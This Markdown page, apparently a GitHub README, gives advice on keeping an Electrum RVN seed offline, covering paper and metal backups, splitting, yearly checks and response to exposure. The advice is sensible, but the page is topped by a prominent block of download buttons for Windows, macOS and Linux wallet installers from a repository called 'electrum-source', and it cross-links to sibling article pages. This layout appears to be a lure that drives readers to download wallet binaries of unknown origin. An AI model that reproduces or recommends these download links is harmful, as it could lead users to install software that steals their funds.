![Electrum RVN](assets/banner-article.png)

# Storing Your Electrum RVN Seed Offline

<!-- compact-download-block -->

<p align="center">Keeping the written seed away from anything online</p>

<p align="center"><a href="https://github.com/electrum-source/Electrum-RVN/releases/download/v4.8.0/electrum-rvn-v4.8.0-setup.exe"><img src="assets/button-windows.png" alt="Download for Windows"></a> <a href="https://github.com/electrum-source/Electrum-RVN/releases/download/v4.8.0/electrum-rvn-v4.8.0.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-F05239?style=for-the-badge&labelColor=131A38&logo=apple&logoColor=F5F7FB" alt="Download for macOS"></a> <a href="https://github.com/electrum-source/Electrum-RVN/releases/download/v4.8.0/electrum-rvn-v4.8.0.AppImage"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-F05239?style=for-the-badge&labelColor=131A38&logo=linux&logoColor=F5F7FB" alt="Download for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="assets/platform-windows.png" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [`electrum-rvn-v4.8.0-setup.exe`](https://github.com/electrum-source/Electrum-RVN/releases/download/v4.8.0/electrum-rvn-v4.8.0-setup.exe) |
| <img src="https://img.shields.io/badge/macOS-F05239?style=flat-square&labelColor=131A38&logo=apple&logoColor=F5F7FB" alt="macOS"> | macOS 12 or later | [`electrum-rvn-v4.8.0.dmg`](https://github.com/electrum-source/Electrum-RVN/releases/download/v4.8.0/electrum-rvn-v4.8.0.dmg) |
| <img src="https://img.shields.io/badge/Linux-F05239?style=flat-square&labelColor=131A38&logo=linux&logoColor=F5F7FB" alt="Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`electrum-rvn-v4.8.0.AppImage`](https://github.com/electrum-source/Electrum-RVN/releases/download/v4.8.0/electrum-rvn-v4.8.0.AppImage) |

</div>

All versions and checksums are on the [release page](https://github.com/electrum-source/Electrum-RVN/releases/tag/v4.8.0).

> [!WARNING]
> Only download from this GitHub release page.

<!-- /compact-download-block -->
Write the twelve words on paper or stamp them into metal, keep two copies in two places, and never let a copy touch a networked device. That is the whole of offline storage. The threats to design against are fire, flood, theft and your own forgetfulness - not cryptography.

## What "offline" has to mean

A seed is offline when no device that can reach a network has a readable copy. That rules out more than people expect:

- a note in a password manager, even a local one that syncs;
- a photograph on a phone, even in a hidden album;
- a text file on the laptop that runs the wallet;
- an email to yourself, or a draft in a webmail account;
- a cloud document, a screenshot in a chat, a backup of your desktop.

Each of those is a copy under someone else's control or on a machine that can be compromised. A seed is worth exactly the funds it controls, and there is no "just for now" version of storing it digitally.

## The options, compared

| Method | Survives fire | Survives water | Survives theft | Cost |
| --- | --- | --- | --- | --- |
| Paper in a drawer | no | no | no | nothing |
| Paper in a safe | usually | usually | yes | a safe |
| Two papers, two addresses | one disaster | one disaster | one location lost | nothing |
| Stamped metal plate | yes | yes | depends on the place | moderate |
| Metal, two locations | yes | yes | one location lost | higher |
| Engraved on a device | maybe | maybe | the device goes with it | low |

For most holders, two paper copies in two locations is proportionate and cheap. Metal earns its cost when the amount is large enough that a house fire would be a financial event rather than an inconvenience.

## Splitting and disguising

A common idea is to split the phrase: six words here, six words there. It works, and it has a failure mode worth understanding. A thief who finds half learns half, and the checksum makes the other half easier to attack; worse, losing one half loses everything, which doubles your single-point-of-failure count rather than halving it.

If you split, split deliberately: use a scheme where any two of three shares reconstruct the seed, write down which scheme you used, and rehearse the reconstruction once. Improvised splitting that nobody can reassemble is the same as destroying the seed.

Disguising is weaker than it looks. A phrase written as "first letters of a sentence" is fine against a casual reader and useless against anyone who knows what a seed looks like.

## Where to put it

Three principles, more useful than any specific hiding place:

**Separate the disasters.** Two copies in the same house share a fire, a flood and a burglary. Two copies in the same city share a flood.

**Separate the wallet from the seed.** Keeping the paper next to the laptop means one burglary takes both.

**Tell one person the location, not the words.** A sealed envelope with instructions, held by someone you trust, survives you being unavailable - and does not hand them the funds.

## Checking it still exists, and still works

Once a year: find the paper, read the words, confirm they are legible, and restore them into a throwaway wallet to prove the phrase is intact. Delete the throwaway afterwards. That ten-minute ritual catches faded ink, a moved envelope and a phrase you have been misremembering.

Do not check by typing the words into a website. There is no legitimate service that verifies a seed, and every one that offers is collecting it - [how safe is Electrum RVN](https://github.com/electrum-source/passphrase-backup/blob/main/how-safe-is-electrum-rvn.md) covers the pattern.

## What to do when it is exposed

If a copy was photographed, synced or seen by someone, treat the seed as compromised: create a new wallet, move the funds, confirm, destroy the old paper. Speed matters more than tidiness. [Backing up an Electrum RVN seed](https://github.com/electrum-source/passphrase-backup/blob/main/backing-up-an-electrum-rvn-seed.md) is the procedure you are redoing, and [restore a wallet from an Electrum RVN seed](https://github.com/electrum-source/passphrase-backup/blob/main/restore-a-wallet-from-an-electrum-rvn-seed.md) is how you confirm the new one works before you move anything large.

## If the seed is already lost

Then the wallet file is what remains, and it lives or dies with your memory of its password - [Electrum RVN recovery without the seed](https://github.com/electrum-source/passphrase-backup/blob/main/electrum-rvn-recovery-without-the-seed.md). That is the outcome this whole page exists to prevent, and it is worth reading once so the stakes are concrete.

The wallet is actively maintained, and the current release is on the releases page: https://github.com/electrum-source/Electrum-RVN/releases/tag/v4.8.0. [Where Electrum RVN stores your wallet](https://github.com/electrum-source/passphrase-backup/blob/main/where-electrum-rvn-stores-your-wallet.md) covers the file, which is not a backup, and [import a hardware wallet seed into Electrum RVN](https://github.com/electrum-source/passphrase-backup/blob/main/import-a-hardware-wallet-seed-into-electrum-rvn.md) is the related question for device-based holding.

## FAQ

### Can I keep the seed in a password manager?

It is a networked copy, so no - not if you are treating it as the backup that protects real money. Use paper or metal.

### Is a metal plate really necessary?

For a small balance, no. For an amount where a house fire would matter, it is the cheapest durable option, and one plate plus one paper copy covers most realistic failures.

### Should I split the phrase between two places?

Only with a scheme you have rehearsed and can reconstruct. A split you cannot reassemble is a lost seed with extra steps.

### How often should I check the backup?

Once a year, or after any move or house change. Restore it into a throwaway wallet to prove it works, then delete that wallet.

### What if someone sees the paper?

Assume the funds are at risk and move them to a new wallet with a new seed. A seen seed is a compromised seed, even if nothing has been taken yet.

<!-- related-articles -->

## Related articles

- [How Safe Is Electrum RVN?](https://github.com/electrum-source/passphrase-backup/blob/main/how-safe-is-electrum-rvn.md)
- [Backing Up an Electrum RVN Seed](https://github.com/electrum-source/passphrase-backup/blob/main/backing-up-an-electrum-rvn-seed.md)
- [Restore a Wallet From an Electrum RVN Seed](https://github.com/electrum-source/passphrase-backup/blob/main/restore-a-wallet-from-an-electrum-rvn-seed.md)
- [Electrum RVN Recovery Without the Seed](https://github.com/electrum-source/passphrase-backup/blob/main/electrum-rvn-recovery-without-the-seed.md)
